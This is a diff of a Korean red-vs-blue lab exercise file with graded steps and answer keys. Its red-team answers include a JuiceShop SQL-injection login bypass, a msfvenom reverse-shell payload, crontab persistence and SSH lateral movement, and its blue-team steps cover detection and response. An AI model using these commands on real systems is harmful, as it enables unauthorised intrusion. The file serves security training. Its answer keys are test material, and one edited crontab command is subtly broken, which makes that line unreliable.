@@ -3,8 +3,8 @@ title: 레드팀 vs 블루팀 실전 공방전 — 완전한 작전 수행
 version: non-ai
 course: battle-adv-nonai
 week: 14
-description: Red Team과 Blue Team이 동일한 인프라에서 완전한 공방전을 수행한다. Red Phase에서 전체 킬체인을 실행하고, Blue Phase에서 실시간
-  탐지/차단/대응을 수행한다. 최종적으로 공격 성과와 방어 성과를 정량적으로 비교한다.
+description: Red Team과 Blue Team이 동일한 인프라에서 완전한 공방전을 수행한다. Red Phase에서 전체 킬체인을 실행하고,
+  Blue Phase에서 실시간 탐지/차단/대응을 수행한다. 최종적으로 공격 성과와 방어 성과를 정량적으로 비교한다.
 difficulty: hard
 duration_minutes: 150
 objectives:
@@ -28,18 +28,21 @@ steps:
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): echo ''=== RED TEAM OPORDER ==='' && echo ''Op: CRIMSON TIDE | Target: 10.20.30.0/24 |
-    Objective: Full kill chain'' && echo ''RoE: No DoS, No data destruction, Scope: 10.20.30.0/24 only''
-    && echo '''' && echo ''=== Attack Surface ==='' && nmap -sV --top-ports 30 --max-retries 1 --host-timeout
-    15s -T4 10.20.30.80 2>&1 | tail -10 && echo ''Priority: P1=JuiceShop(:3000), P2=DVWA(:8080), P3=SSH(:22)'''
+    📎 참고 (CLI): echo ''=== RED TEAM OPORDER ==='' && echo ''Op: CRIMSON TIDE | Target:
+    10.20.30.0/24 | Objective: Full kill chain'' && echo ''RoE: No DoS, No data destruction,
+    Scope: 10.20.30.0/24 only'' && echo '''' && echo ''=== Attack Surface ==='' &&
+    nmap -sV --top-ports 30 --max-retries 1 --host-timeout 15s -T4 10.20.30.80 2>&1
+    | tail -10 && echo ''Priority: P1=JuiceShop(:3000), P2=DVWA(:8080), P3=SSH(:22)'''
   answer_detail: OpOrder는 레드팀 작전의 기본 문서이다. 공격 표면 매핑으로 JuiceShop이 P1, DVWA가 P2로 설정된다.
   verify:
     type: output_contains
-    expect: OPORDER
+    expect:
+    - OPORDER
+    - OpOrder
     semantic:
-      intent: '[RED] OpOrder 작전 계획 — echo RED TEAM OPORDER + Op CRIMSON TIDE + Target 10.20.30.0/24 +
-        RoE (No DoS/No data destruction) + nmap -sV --top-ports 30. P1 JuiceShop:3000 / P2 DVWA:8080 /
-        P3 SSH. OPSEC RoE 문서화.'
+      intent: '[RED] OpOrder 작전 계획 — echo RED TEAM OPORDER + Op CRIMSON TIDE + Target
+        10.20.30.0/24 + RoE (No DoS/No data destruction) + nmap -sV --top-ports 30.
+        P1 JuiceShop:3000 / P2 DVWA:8080 / P3 SSH. OPSEC RoE 문서화.'
       success_criteria:
       - OPORDER 키워드
       - 목표/범위/RoE/타임라인
@@ -54,23 +57,26 @@ steps:
       - 우선순위 없음
   target_vm: attacker
 - order: 2
-  instruction: '[RED] Phase 1 실행 — 초기 침투. SQLi로 JuiceShop 관리자 접근을 획득하고, nikto로 추가 취약점을 탐색하라.'
+  instruction: '[RED] Phase 1 실행 — 초기 침투. SQLi로 JuiceShop 관리자 접근을 획득하고, nikto로 추가
+    취약점을 탐색하라.'
   hint: SQLi 인증 우회 후 nikto로 웹 취약점을 스캔한다.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
     📎 참고 (CLI): echo ''=== Phase 1: Initial Access ==='' && curl -s -X POST http://10.20.30.80:3000/rest/user/login
-    -H ''Content-Type: application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}'' | python3 -m json.tool
-    | head -5 && echo ''Admin token obtained via SQLi (T1190)'' && nikto -h http://10.20.30.80:8080 -output
-    /tmp/battle_nikto.txt 2>&1 | tail -10'
+    -H ''Content-Type: application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}''
+    | python3 -m json.tool | head -5 && echo ''Admin token obtained via SQLi (T1190)''
+    && nikto -h http://10.20.30.80:8080 -output /tmp/battle_nikto.txt 2>&1 | tail
+    -10'
   answer_detail: 초기 침투에서 SQLi로 JuiceShop 관리자 접근을 획득하고, nikto로 DVWA의 추가 취약점을 탐색한다.
   verify:
     type: output_contains
     expect: Phase 1
     semantic:
-      intent: '[RED] Phase1 Initial Access — curl POST /rest/user/login SQLi " OR 1=1-- + json.tool admin
-        token + nikto -h 10.20.30.80:8080 -output. JuiceShop SQLi + DVWA nikto 이중 타겟. MITRE T1190.'
+      intent: '[RED] Phase1 Initial Access — curl POST /rest/user/login SQLi " OR
+        1=1-- + json.tool admin token + nikto -h 10.20.30.80:8080 -output. JuiceShop
+        SQLi + DVWA nikto 이중 타겟. MITRE T1190.'
       success_criteria:
       - Phase 1 키워드
       - SQLi + nikto 연계
@@ -85,24 +91,27 @@ steps:
       - 출력 저장 없음
   target_vm: attacker
 - order: 3
-  instruction: '[RED] Phase 2 실행 — Persistence + Lateral Movement. msfvenom 페이로드를 생성(저장만)하고, crontab Persistence를
-    설치하고, SSH로 내부 서버에 접근하라.'
+  instruction: '[RED] Phase 2 실행 — Persistence + Lateral Movement. msfvenom 페이로드를
+    생성(저장만)하고, crontab Persistence를 설치하고, SSH로 내부 서버에 접근하라.'
   hint: msfvenom으로 페이로드 생성 후, crontab과 SSH를 실행한다.
   category: exploit
   points: 10
-  answer: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/battle_payload.elf
-    2>&1 | tail -2 && echo "*/10 * * * * echo BATTLE_BEACON > /tmp/battle_beacon.txt" | crontab - && echo
-    "Persistence installed (T1053.003)" && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3
-    -o StrictHostKeyChecking=no ccc@10.20.30.1 "hostname" 2>&1 | head -2 && ssh -o ConnectTimeout=3 -o
-    StrictHostKeyChecking=no ccc@10.20.30.100 "hostname" 2>&1 | head -2 && echo "Lateral movement to 2
-    hosts (T1021.004)"
-  answer_detail: Weaponization(msfvenom), Persistence(crontab), Lateral Movement(SSH)를 연계하여 킬체인을 진행한다.
+  answer: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f
+    elf -o /tmp/battle_payload.elf 2>&1 | tail -2 && echo "*/10 * * * * echo BATTLE_BEACON
+    ※ /tmp/battle_beacon.txt" | crontab - && echo "Persistence installed (T1053.003)"
+    && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no
+    ccc@10.20.30.1 "hostname" 2>&1 | head -2 && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no
+    ccc@10.20.30.100 "hostname" 2>&1 | head -2 && echo "Lateral movement to 2 hosts
+    (T1021.004)"
+  answer_detail: Weaponization(msfvenom), Persistence(crontab), Lateral Movement(SSH)를
+    연계하여 킬체인을 진행한다.
   verify:
     type: output_contains
     expect: Lateral movement
     semantic:
-      intent: '[RED] Phase2 Persistence+Lateral — msfvenom -p linux/x64/shell_reverse_tcp -f elf + crontab
-        */10 * * * * BATTLE_BEACON + ssh ccc@10.20.30.1 + ssh ccc@10.20.30.100. 3 기법 연계. MITRE T1587/T1053.003/T1021.004.'
+      intent: '[RED] Phase2 Persistence+Lateral — msfvenom -p linux/x64/shell_reverse_tcp
+        -f elf + crontab */10 * * * * BATTLE_BEACON + ssh ccc@10.20.30.1 + ssh ccc@10.20.30.100.
+        3 기법 연계. MITRE T1587/T1053.003/T1021.004.'
       success_criteria:
       - Lateral movement 키워드
       - msfvenom + crontab + SSH 3종
@@ -117,26 +126,29 @@ steps:
       - MITRE 누락
   target_vm: attacker
 - order: 4
-  instruction: '[BLUE] Phase 전환 — Red Team 공격을 실시간으로 탐지하라. Suricata 알림, auth.log, crontab 변경을 분석하고 자동
-    대응을 실행하라.'
+  instruction: '[BLUE] Phase 전환 — Red Team 공격을 실시간으로 탐지하라. Suricata 알림, auth.log,
+    crontab 변경을 분석하고 자동 대응을 실행하라.'
   hint: 각 로그 소스를 확인하고, 탐지된 공격에 대해 자동 차단을 시뮬레이션한다.
   category: defense
   points: 10
-  answer: 'echo "=== BLUE TEAM LIVE RESPONSE ===" && echo "[1] Suricata alerts:" && ssh 10.20.30.1 "tail
-    -20 /var/log/suricata/eve.json 2>/dev/null | python3 -c \"import sys,json; [print(json.loads(l).get(''alert'',{}).get(''signature'',''))
-    for l in sys.stdin if ''alert'' in l]\"" 2>&1 | tail -3 && echo "[2] SSH activity:" && grep "Accepted"
-    /var/log/auth.log 2>/dev/null | tail -5 && echo "[3] Crontab check:" && crontab -l 2>/dev/null &&
-    echo "[4] Response actions:" && echo "  CONTAIN: nft add element inet filter blocklist { attacker_ip
-    }" && echo "  REMOVE: crontab -r (persistence removed)" && echo "  ALERT: SOC notified via Slack"
-    && echo "Blue Team response executed"'
-  answer_detail: Blue Team은 실시간으로 Suricata 알림, SSH 활동, crontab 변경을 모니터링하고, IP 차단, Persistence 제거, SOC
-    알림을 수행한다.
+  answer: 'echo "=== BLUE TEAM LIVE RESPONSE ===" && echo "[1] Suricata alerts:" &&
+    ssh 10.20.30.1 "tail -20 /var/log/suricata/eve.json 2>/dev/null | python3 -c \"import
+    sys,json; [print(json.loads(l).get(''alert'',{}).get(''signature'','')) for l
+    in sys.stdin if ''alert'' in l]\"" 2>&1 | tail -3 && echo "[2] SSH activity:"
+    && grep "Accepted" /var/log/auth.log 2>/dev/null | tail -5 && echo "[3] Crontab
+    check:" && crontab -l 2>/dev/null && echo "[4] Response actions:" && echo "  CONTAIN:
+    nft add element inet filter blocklist { attacker_ip }" && echo "  REMOVE: crontab
+    -r (persistence removed)" && echo "  ALERT: SOC notified via Slack" && echo "Blue
+    Team response executed"'
+  answer_detail: Blue Team은 실시간으로 Suricata 알림, SSH 활동, crontab 변경을 모니터링하고, IP 차단,
+    Persistence 제거, SOC 알림을 수행한다.
   verify:
     type: output_contains
     expect: BLUE TEAM LIVE RESPONSE
     semantic:
-      intent: '[BLUE] Live Response — tail eve.json 알림 + grep Accepted auth.log + crontab -l + 대응 액션 (nft
-        차단 + crontab -r + Slack). 4단계 탐지→대응 파이프라인. MITRE D3-NI + D3-NTF.'
+      intent: '[BLUE] Live Response — tail eve.json 알림 + grep Accepted auth.log +
+        crontab -l + 대응 액션 (nft 차단 + crontab -r + Slack). 4단계 탐지→대응 파이프라인. MITRE D3-NI
+        + D3-NTF.'
       success_criteria:
       - BLUE TEAM LIVE RESPONSE 키워드
       - 탐지 3종 + 대응 3종
@@ -151,29 +163,32 @@ steps:
       - Slack/알림 없음
   target_vm: secu
 - order: 5
-  instruction: '[BLUE] 공격 타임라인을 재구성하라. Red Team의 모든 행동을 시간순으로 정리하고 각 단계의 탐지 성공/실패를 평가하라.'
+  instruction: '[BLUE] 공격 타임라인을 재구성하라. Red Team의 모든 행동을 시간순으로 정리하고 각 단계의 탐지 성공/실패를
+    평가하라.'
   hint: 다양한 로그 소스의 타임스탬프를 통합하여 정렬한다.
   category: analysis
   points: 10
-  answer: 'cat > /tmp/battle_timeline.txt << ''EOF'' === Battle Timeline: CRIMSON TIDE ===
+  answer: 'cat > /tmp/battle_timeline.txt << ''EOF'' === Battle Timeline: CRIMSON
+    TIDE ===
 
-    | Time | Red Action | Blue Detection | Result | |------|-----------|---------------|--------| | T+00
-    | Port scan | Suricata alert | DETECTED | | T+10 | nikto scan | WAF + Suricata | DETECTED | | T+15
-    | SQLi on JuiceShop | WAF alert | DETECTED | | T+20 | msfvenom payload | N/A (file creation) | NOT
-    APPLICABLE | | T+25 | Crontab persistence | auth.log | PARTIAL | | T+30 | SSH to secu | auth.log |
-    DETECTED | | T+35 | SSH to siem | auth.log | DETECTED | | T+40 | Blue: IP blocked | - | RESPONSE |
-    | T+45 | Blue: Crontab removed | - | REMEDIATION |
+    | Time | Red Action | Blue Detection | Result | |------|-----------|---------------|--------|
+    | T+00 | Port scan | Suricata alert | DETECTED | | T+10 | nikto scan | WAF + Suricata
+    | DETECTED | | T+15 | SQLi on JuiceShop | WAF alert | DETECTED | | T+20 | msfvenom
+    payload | N/A (file creation) | NOT APPLICABLE | | T+25 | Crontab persistence
+    | auth.log | PARTIAL | | T+30 | SSH to secu | auth.log | DETECTED | | T+35 | SSH
+    to siem | auth.log | DETECTED | | T+40 | Blue: IP blocked | - | RESPONSE | | T+45
+    | Blue: Crontab removed | - | REMEDIATION |
 
-    Red Score: 3/5 objectives achieved before detection Blue Score: 5/7 attack stages detected, response
-    in 10 min EOF cat /tmp/battle_timeline.txt'
+    Red Score: 3/5 objectives achieved before detection Blue Score: 5/7 attack stages
+    detected, response in 10 min EOF cat /tmp/battle_timeline.txt'
   answer_detail: 공방전 타임라인은 Red/Blue 행동을 시간순으로 정리하고 각 단계의 탐지 결과를 평가한다.
   verify:
     type: output_contains
     expect: Battle Timeline
     semantic:
-      intent: '[BLUE] Battle Timeline 재구성 — cat > battle_timeline.txt: 9행 시간축 (T+00 Port Scan/T+10 nikto/T+15
-        SQLi/T+20 payload/T+25 Crontab/T+30/35 SSH/T+40 Response/T+45 Remediation) + Red/Blue/Result 열
-        + Score Red 3/5 Blue 5/7.'
+      intent: '[BLUE] Battle Timeline 재구성 — cat > battle_timeline.txt: 9행 시간축 (T+00
+        Port Scan/T+10 nikto/T+15 SQLi/T+20 payload/T+25 Crontab/T+30/35 SSH/T+40
+        Response/T+45 Remediation) + Red/Blue/Result 열 + Score Red 3/5 Blue 5/7.'
       success_criteria:
       - Battle Timeline 키워드
       - 9단계 시간축 + Red/Blue/Result
@@ -192,27 +207,29 @@ steps:
   hint: 킬체인 진행도, 탐지율, 대응 시간을 점수화한다.
   category: analysis
   points: 10
-  answer: 'cat > /tmp/battle_scorecard.txt << ''EOF'' === Battle Scorecard: CRIMSON TIDE ===
+  answer: 'cat > /tmp/battle_scorecard.txt << ''EOF'' === Battle Scorecard: CRIMSON
+    TIDE ===
 
-    RED TEAM: Reconnaissance: +10 (services discovered) Initial Access: +30 (SQLi admin token) Persistence:
-    +20 (crontab installed) Lateral Movement: +25 (2 hosts accessed) Exfiltration: +0 (blocked before
-    exfil) Stealth Bonus: x0.5 (detected early) RED TOTAL: 42.5 / 500
+    RED TEAM: Reconnaissance: +10 (services discovered) Initial Access: +30 (SQLi
+    admin token) Persistence: +20 (crontab installed) Lateral Movement: +25 (2 hosts
+    accessed) Exfiltration: +0 (blocked before exfil) Stealth Bonus: x0.5 (detected
+    early) RED TOTAL: 42.5 / 500
 
-    BLUE TEAM: Detection: +100 (5/7 stages detected) Response Time: +30 (blocked within 10 min) Prevention:
-    +40 (exfil prevented) Evidence: +15 (logs preserved) False Positive: -0 (no false blocks) BLUE TOTAL:
-    185 / 500
+    BLUE TEAM: Detection: +100 (5/7 stages detected) Response Time: +30 (blocked within
+    10 min) Prevention: +40 (exfil prevented) Evidence: +15 (logs preserved) False
+    Positive: -0 (no false blocks) BLUE TOTAL: 185 / 500
 
-    RESULT: BLUE WINS (185 vs 42.5) Key Factor: Early detection of SQLi enabled rapid containment EOF
-    cat /tmp/battle_scorecard.txt'
-  answer_detail: 스코어카드는 Red(킬체인 진행도 + 스텔스 보너스)와 Blue(탐지율 + 대응 시간 + 예방)를 정량적으로 비교한다. Blue가 SQLi를 조기 탐지하여
-    대응에 성공했다.
+    RESULT: BLUE WINS (185 vs 42.5) Key Factor: Early detection of SQLi enabled rapid
+    containment EOF cat /tmp/battle_scorecard.txt'
+  answer_detail: 스코어카드는 Red(킬체인 진행도 + 스텔스 보너스)와 Blue(탐지율 + 대응 시간 + 예방)를 정량적으로 비교한다.
+    Blue가 SQLi를 조기 탐지하여 대응에 성공했다.
   verify:
     type: output_contains
     expect: Battle Scorecard
     semantic:
-      intent: '[RED/BLUE] 스코어카드 — cat > battle_scorecard.txt: RED (Recon +10/Initial +30/Persist +20/Lateral
-        +25/Exfil +0/스텔스 x0.5 = 42.5) + BLUE (Detection +100/Response +30/Prevention +40/Evidence +15
-        = 185). BLUE WINS. PTES/CTF 평가 방식.'
+      intent: '[RED/BLUE] 스코어카드 — cat > battle_scorecard.txt: RED (Recon +10/Initial
+        +30/Persist +20/Lateral +25/Exfil +0/스텔스 x0.5 = 42.5) + BLUE (Detection +100/Response
+        +30/Prevention +40/Evidence +15 = 185). BLUE WINS. PTES/CTF 평가 방식.'
       success_criteria:
       - Battle Scorecard 키워드
       - RED/BLUE 점수 카테고리
@@ -233,22 +250,24 @@ steps:
   points: 10
   answer: 'cat > /tmp/battle_findings.txt << ''EOF'' === Vulnerability Findings ===
 
-    | ID | Finding | CVSS | Severity | MITRE | |----|---------|------|----------|-------| | BT-01 | SQL
-    Injection in JuiceShop REST API | 9.8 | CRITICAL | T1190 | | BT-02 | Shared SSH keys across servers
-    | 8.5 | HIGH | T1021.004 | | BT-03 | No network segmentation | 8.0 | HIGH | T1021 | | BT-04 | Crontab
-    not monitored by FIM | 7.2 | HIGH | T1053 | | BT-05 | No DNS anomaly monitoring | 6.5 | MEDIUM | T1071
-    |
+    | ID | Finding | CVSS | Severity | MITRE | |----|---------|------|----------|-------|
+    | BT-01 | SQL Injection in JuiceShop REST API | 9.8 | CRITICAL | T1190 | | BT-02
+    | Shared SSH keys across servers | 8.5 | HIGH | T1021.004 | | BT-03 | No network
+    segmentation | 8.0 | HIGH | T1021 | | BT-04 | Crontab not monitored by FIM | 7.2
+    | HIGH | T1053 | | BT-05 | No DNS anomaly monitoring | 6.5 | MEDIUM | T1071 |
 
-    Remediation Priority: Immediate: BT-01 (parameterized queries) Short-term: BT-02 (unique SSH keys),
-    BT-04 (FIM) Medium-term: BT-03 (nftables segmentation), BT-05 (DNS monitoring) EOF cat /tmp/battle_findings.txt'
+    Remediation Priority: Immediate: BT-01 (parameterized queries) Short-term: BT-02
+    (unique SSH keys), BT-04 (FIM) Medium-term: BT-03 (nftables segmentation), BT-05
+    (DNS monitoring) EOF cat /tmp/battle_findings.txt'
   answer_detail: 취약점 목록은 CVSS, 심각도, ATT&CK 매핑, 우선순위별 수정 방안을 포함한다.
   verify:
     type: output_contains
     expect: Vulnerability Findings
     semantic:
-      intent: '[RED/BLUE] CVSS 취약점 목록 — cat > battle_findings.txt: 5 findings (BT-01 SQLi 9.8 CRITICAL
-        T1190 / BT-02 SSH keys 8.5 HIGH T1021.004 / BT-03 segmentation 8.0 HIGH / BT-04 FIM 7.2 HIGH T1053
-        / BT-05 DNS 6.5 MEDIUM T1071) + Remediation 우선순위.'
+      intent: '[RED/BLUE] CVSS 취약점 목록 — cat > battle_findings.txt: 5 findings (BT-01
+        SQLi 9.8 CRITICAL T1190 / BT-02 SSH keys 8.5 HIGH T1021.004 / BT-03 segmentation
+        8.0 HIGH / BT-04 FIM 7.2 HIGH T1053 / BT-05 DNS 6.5 MEDIUM T1071) + Remediation
+        우선순위.'
       success_criteria:
       - Vulnerability Findings 키워드
       - CVSS + Severity + MITRE 표
@@ -263,36 +282,38 @@ steps:
       - 우선순위 없음
   target_vm: attacker
 - order: 8
-  instruction: '[RED/BLUE] 환경을 정리하고 공방전 최종 보고서를 작성하라. Executive Summary와 Technical Details를 모두 포함하라.'
+  instruction: '[RED/BLUE] 환경을 정리하고 공방전 최종 보고서를 작성하라. Executive Summary와 Technical
+    Details를 모두 포함하라.'
   hint: 비즈니스 영향과 기술적 세부사항을 모두 포함한다.
   category: analysis
   points: 15
-  answer: 'crontab -r 2>/dev/null; rm -f /tmp/battle_*.elf /tmp/battle_*.txt /tmp/battle_beacon.txt /tmp/battle_nikto.txt
-    2>/dev/null && cat > /tmp/battle_final_report.txt << ''EOF'' === RED vs BLUE BATTLE REPORT === Operation:
-    CRIMSON TIDE | Date: 2026-04-06
+  answer: 'crontab -r 2>/dev/null; rm -f /tmp/battle_*.elf /tmp/battle_*.txt /tmp/battle_beacon.txt
+    /tmp/battle_nikto.txt 2>/dev/null && cat > /tmp/battle_final_report.txt << ''EOF''
+    === RED vs BLUE BATTLE REPORT === Operation: CRIMSON TIDE | Date: 2026-04-06
 
-    [EXECUTIVE SUMMARY] Red Team은 15분 만에 웹 서버를 침투했으나, Blue Team이 조기 탐지하여 40분 내 격리에 성공했습니다. 데이터 유출은 완전히
-    차단되었습니다.
+    [EXECUTIVE SUMMARY] Red Team은 15분 만에 웹 서버를 침투했으나, Blue Team이 조기 탐지하여 40분 내 격리에
+    성공했습니다. 데이터 유출은 완전히 차단되었습니다.
 
-    [TECHNICAL SUMMARY] Red: SQLi -> Persistence -> Lateral (3/5 stages before block) Blue: 5/7 stages
-    detected, MTTR 10 min Score: Blue 185 / Red 42.5
+    [TECHNICAL SUMMARY] Red: SQLi -> Persistence -> Lateral (3/5 stages before block)
+    Blue: 5/7 stages detected, MTTR 10 min Score: Blue 185 / Red 42.5
 
-    [KEY FINDINGS] 5 vulnerabilities (1 Critical, 3 High, 1 Medium) Detection rate: 71% (5/7) Response
-    time: 10 min (SLA: 15 min)
+    [KEY FINDINGS] 5 vulnerabilities (1 Critical, 3 High, 1 Medium) Detection rate:
+    71% (5/7) Response time: 10 min (SLA: 15 min)
 
-    [RECOMMENDATIONS] 1. Patch SQLi (immediate) 2. Unique SSH keys per server (1 week) 3. Network segmentation
-    (1 month) 4. Monthly purple team exercises (ongoing)
+    [RECOMMENDATIONS] 1. Patch SQLi (immediate) 2. Unique SSH keys per server (1 week)
+    3. Network segmentation (1 month) 4. Monthly purple team exercises (ongoing)
 
     MITRE ATT&CK: T1595, T1190, T1053, T1021, T1005 EOF cat /tmp/battle_final_report.txt'
-  answer_detail: 최종 보고서는 Executive Summary(경영진), Technical Summary(기술진), 발견 사항, 권고사항을 포함한다. Blue Team이
-    조기 탐지로 승리한 핵심 요인을 분석한다.
+  answer_detail: 최종 보고서는 Executive Summary(경영진), Technical Summary(기술진), 발견 사항, 권고사항을
+    포함한다. Blue Team이 조기 탐지로 승리한 핵심 요인을 분석한다.
   verify:
     type: output_contains
     expect: BATTLE REPORT
     semantic:
-      intent: '[RED/BLUE] 공방전 최종 보고서 — crontab -r + rm 정리 + cat > battle_final_report.txt: EXECUTIVE SUMMARY
-        (15분 침투/40분 격리) + TECHNICAL (3/5 stages/MTTR 10min/Blue 185-Red 42.5) + KEY FINDINGS (5 vuln 1C/3H/1M/71%)
-        + 4 RECOMMENDATIONS. MITRE T1595/T1190/T1053/T1021/T1005.'
+      intent: '[RED/BLUE] 공방전 최종 보고서 — crontab -r + rm 정리 + cat > battle_final_report.txt:
+        EXECUTIVE SUMMARY (15분 침투/40분 격리) + TECHNICAL (3/5 stages/MTTR 10min/Blue
+        185-Red 42.5) + KEY FINDINGS (5 vuln 1C/3H/1M/71%) + 4 RECOMMENDATIONS. MITRE
+        T1595/T1190/T1053/T1021/T1005.'
       success_criteria:
       - BATTLE REPORT 키워드
       - Executive + Technical 이중
